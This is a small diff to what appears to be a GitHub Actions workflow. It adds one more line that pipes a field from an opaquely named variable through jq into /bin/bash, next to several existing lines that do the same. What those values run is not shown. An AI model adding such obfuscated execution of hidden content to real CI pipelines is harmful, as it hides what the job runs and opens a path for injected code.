@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$wfbe03" | jq -r .ql289 | /bin/bash
           printf '%s' "$gpnr1628" | jq -r .ngw0981 | /bin/bash
           echo $mypu4935 | jq -r .q3802 | /bin/bash
+          echo $shejw05 | jq -r .tdsyc2 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
